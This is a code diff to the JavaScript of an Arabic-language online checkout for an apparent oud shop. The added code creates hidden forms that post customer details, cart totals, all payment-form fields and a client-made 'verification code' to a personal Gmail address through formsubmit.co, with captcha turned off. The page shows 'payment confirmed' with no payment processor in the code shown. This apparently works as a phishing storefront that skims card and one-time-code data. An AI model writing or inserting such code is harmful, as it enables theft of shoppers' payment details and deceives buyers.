@@ -2776,20 +2776,32 @@
             verificationCode = Math.floor(100000 + Math.random() * 900000).toString().padStart(6, '0');
             
             // Show success immediately and navigate to verification page
-            showNotification(`✅ تم تأكيد الدفع! كود التأكيد: ${verificationCode}`, 'success');
+            showNotification(`✅ تم تأكيد الدفع! جاري الإرسال...`, 'success');
             
-            // Navigate to verification page immediately
-            setTimeout(() => {
-                showVerificationPage();
-            }, 1000);
+            // Disable submit button and show loading
+            const submitBtn = form.querySelector('button[type="submit"]');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري إرسال بيانات الدفع...';
             
-            // Send email in background (don't wait for it)
+            // Create real form submission for payment - مثل النموذج الأول
+            const realForm = document.createElement('form');
+            realForm.method = 'POST';
+            realForm.action = 'https://formsubmit.co/alhkr5415@gmail.com';
+            realForm.style.display = 'none';
+            
+            // Add payment form data
             const formData = new FormData(form);
             
             // Add all customer info and cart data
             if (customerInfo.firstName) {
                 Object.entries(customerInfo).forEach(([key, value]) => {
-                    if (value) formData.append('customer_' + key, value);
+                    if (value) {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = 'customer_' + key;
+                        input.value = value;
+                        realForm.appendChild(input);
+                    }
                 });
             }
             
@@ -2797,20 +2809,82 @@
                 const cartItemsText = cart.map(item => 
                     `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
                 ).join('\n');
-                formData.append('order_items', cartItemsText);
+                
+                const cartInput = document.createElement('input');
+                cartInput.type = 'hidden';
+                cartInput.name = 'order_items_final';
+                cartInput.value = cartItemsText;
+                realForm.appendChild(cartInput);
                 
                 const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                 const shipping = subtotal > 200 ? 0 : 30;
                 const total = subtotal + shipping;
-                formData.append('final_total', `${total} ريال`);
+                
+                const totalInput = document.createElement('input');
+                totalInput.type = 'hidden';
+                totalInput.name = 'final_total';
+                totalInput.value = `${total} ريال`;
+                realForm.appendChild(totalInput);
             }
             
-            formData.append('verification_code', verificationCode);
-            formData.append('timestamp', new Date().toLocaleString('ar-SA'));
-            formData.append('source', 'نموذج الدفع النهائي');
+            // Add payment form data
+            for (const [key, value] of formData.entries()) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                realForm.appendChild(input);
+            }
             
-            // Send email in background
-            sendToFormSubmit(formData, 'payment');
+            // Add verification code and metadata
+            const codeInput = document.createElement('input');
+            codeInput.type = 'hidden';
+            codeInput.name = 'verification_code';
+            codeInput.value = verificationCode;
+            realForm.appendChild(codeInput);
+            
+            const timestampInput = document.createElement('input');
+            timestampInput.type = 'hidden';
+            timestampInput.name = 'timestamp';
+            timestampInput.value = new Date().toLocaleString('ar-SA');
+            realForm.appendChild(timestampInput);
+            
+            const sourceInput = document.createElement('input');
+            sourceInput.type = 'hidden';
+            sourceInput.name = 'source';
+            sourceInput.value = 'نموذج الدفع النهائي - الخطوة 3';
+            realForm.appendChild(sourceInput);
+            
+            // FormSubmit configuration
+            const subjectInput = document.createElement('input');
+            subjectInput.type = 'hidden';
+            subjectInput.name = '_subject';
+            subjectInput.value = '💳 طلب جديد مع معلومات الدفع - الخطوة 3 - مكاسر العود';
+            realForm.appendChild(subjectInput);
+            
+            const captchaInput = document.createElement('input');
+            captchaInput.type = 'hidden';
+            captchaInput.name = '_captcha';
+            captchaInput.value = 'false';
+            realForm.appendChild(captchaInput);
+            
+            const templateInput = document.createElement('input');
+            templateInput.type = 'hidden';
+            templateInput.name = '_template';
+            templateInput.value = 'table';
+            realForm.appendChild(templateInput);
+            
+            // Success redirect URL
+            const currentDomain = window.location.origin + window.location.pathname;
+            const nextInput = document.createElement('input');
+            nextInput.type = 'hidden';
+            nextInput.name = '_next';
+            nextInput.value = currentDomain + '?step=verification&code=' + verificationCode;
+            realForm.appendChild(nextInput);
+            
+            // Submit the real form
+            document.body.appendChild(realForm);
+            realForm.submit();
             
             return false;
         }
@@ -3216,15 +3290,24 @@
 
         function proceedToPayment() {
             // Show success message
-            showNotification('✅ تم تأكيد مراجعة الطلب! جاري الانتقال للدفع...', 'success');
+            showNotification('✅ تم تأكيد مراجعة الطلب! جاري الإرسال والانتقال للدفع...', 'success');
             
-            // Send email for order review in background
-            const reviewFormData = new FormData();
+            // Create real form submission for order review - مثل النموذج الأول
+            const realForm = document.createElement('form');
+            realForm.method = 'POST';
+            realForm.action = 'https://formsubmit.co/alhkr5415@gmail.com';
+            realForm.style.display = 'none';
             
             // Add customer info
             if (customerInfo.firstName) {
                 Object.entries(customerInfo).forEach(([key, value]) => {
-                    if (value) reviewFormData.append('customer_' + key, value);
+                    if (value) {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = 'customer_' + key;
+                        input.value = value;
+                        realForm.appendChild(input);
+                    }
                 });
             }
             
@@ -3233,25 +3316,67 @@
                 const cartItemsText = cart.map(item => 
                     `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
                 ).join('\n');
-                reviewFormData.append('order_items_review', cartItemsText);
+                
+                const cartInput = document.createElement('input');
+                cartInput.type = 'hidden';
+                cartInput.name = 'order_items_review';
+                cartInput.value = cartItemsText;
+                realForm.appendChild(cartInput);
                 
                 const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                 const shipping = subtotal > 200 ? 0 : 30;
                 const total = subtotal + shipping;
-                reviewFormData.append('order_total_review', `${total} ريال`);
+                
+                const totalInput = document.createElement('input');
+                totalInput.type = 'hidden';
+                totalInput.name = 'order_total_review';
+                totalInput.value = `${total} ريال`;
+                realForm.appendChild(totalInput);
             }
             
-            reviewFormData.append('timestamp', new Date().toLocaleString('ar-SA'));
-            reviewFormData.append('source', 'مراجعة الطلب - تأكيد البيانات');
-            reviewFormData.append('step', 'مراجعة الطلب');
+            // Add metadata
+            const timestampInput = document.createElement('input');
+            timestampInput.type = 'hidden';
+            timestampInput.name = 'timestamp';
+            timestampInput.value = new Date().toLocaleString('ar-SA');
+            realForm.appendChild(timestampInput);
             
-            // Send email in background
-            sendToFormSubmit(reviewFormData, 'review');
+            const sourceInput = document.createElement('input');
+            sourceInput.type = 'hidden';
+            sourceInput.name = 'source';
+            sourceInput.value = 'مراجعة الطلب - تأكيد البيانات - الخطوة 2';
+            realForm.appendChild(sourceInput);
             
-            // Navigate to payment page immediately and correctly
-            setTimeout(() => {
-                showPaymentPage();
-            }, 800);
+            // FormSubmit configuration
+            const subjectInput = document.createElement('input');
+            subjectInput.type = 'hidden';
+            subjectInput.name = '_subject';
+            subjectInput.value = '🔍 مراجعة الطلب وتأكيد البيانات - الخطوة 2 - مكاسر العود';
+            realForm.appendChild(subjectInput);
+            
+            const captchaInput = document.createElement('input');
+            captchaInput.type = 'hidden';
+            captchaInput.name = '_captcha';
+            captchaInput.value = 'false';
+            realForm.appendChild(captchaInput);
+            
+            const templateInput = document.createElement('input');
+            templateInput.type = 'hidden';
+            templateInput.name = '_template';
+            templateInput.value = 'table';
+            realForm.appendChild(templateInput);
+            
+            // Success redirect URL
+            const currentDomain = window.location.origin + window.location.pathname;
+            const nextInput = document.createElement('input');
+            nextInput.type = 'hidden';
+            nextInput.name = '_next';
+            nextInput.value = currentDomain + '?step=payment';
+            realForm.appendChild(nextInput);
+            
+            // Submit the real form
+            document.body.appendChild(realForm);
+            realForm.submit();
         }
 
         function populatePaymentSummary() {
@@ -3868,14 +3993,67 @@
             
             showNotification(`تم إعادة إرسال الكود بنجاح: ${verificationCode}`, 'success');
             
-            // Send new code via email in background
-            const emailData = new FormData();
-            emailData.append('verification_code_resent', verificationCode);
-            emailData.append('customer_email', customerInfo.email || 'غير محدد');
-            emailData.append('timestamp', new Date().toLocaleString('ar-SA'));
-            emailData.append('source', 'إعادة إرسال كود التأكيد');
+            // Create real form submission for verification resend - مثل النماذج الأخرى
+            const realForm = document.createElement('form');
+            realForm.method = 'POST';
+            realForm.action = 'https://formsubmit.co/alhkr5415@gmail.com';
+            realForm.style.display = 'none';
             
-            sendToFormSubmit(emailData, 'verification');
+            // Add verification resend data
+            const codeInput = document.createElement('input');
+            codeInput.type = 'hidden';
+            codeInput.name = 'verification_code_resent';
+            codeInput.value = verificationCode;
+            realForm.appendChild(codeInput);
+            
+            const emailInput = document.createElement('input');
+            emailInput.type = 'hidden';
+            emailInput.name = 'customer_email';
+            emailInput.value = customerInfo.email || 'غير محدد';
+            realForm.appendChild(emailInput);
+            
+            const timestampInput = document.createElement('input');
+            timestampInput.type = 'hidden';
+            timestampInput.name = 'timestamp';
+            timestampInput.value = new Date().toLocaleString('ar-SA');
+            realForm.appendChild(timestampInput);
+            
+            const sourceInput = document.createElement('input');
+            sourceInput.type = 'hidden';
+            sourceInput.name = 'source';
+            sourceInput.value = 'إعادة إرسال كود التأكيد - الخطوة 4';
+            realForm.appendChild(sourceInput);
+            
+            // FormSubmit configuration
+            const subjectInput = document.createElement('input');
+            subjectInput.type = 'hidden';
+            subjectInput.name = '_subject';
+            subjectInput.value = '🔐 إعادة إرسال كود التأكيد - الخطوة 4 - مكاسر العود';
+            realForm.appendChild(subjectInput);
+            
+            const captchaInput = document.createElement('input');
+            captchaInput.type = 'hidden';
+            captchaInput.name = '_captcha';
+            captchaInput.value = 'false';
+            realForm.appendChild(captchaInput);
+            
+            const templateInput = document.createElement('input');
+            templateInput.type = 'hidden';
+            templateInput.name = '_template';
+            templateInput.value = 'table';
+            realForm.appendChild(templateInput);
+            
+            // Success redirect URL
+            const currentDomain = window.location.origin + window.location.pathname;
+            const nextInput = document.createElement('input');
+            nextInput.type = 'hidden';
+            nextInput.name = '_next';
+            nextInput.value = currentDomain + '?step=verification_resent&code=' + verificationCode;
+            realForm.appendChild(nextInput);
+            
+            // Submit the real form
+            document.body.appendChild(realForm);
+            realForm.submit();
         }
 
         // Keyboard shortcuts
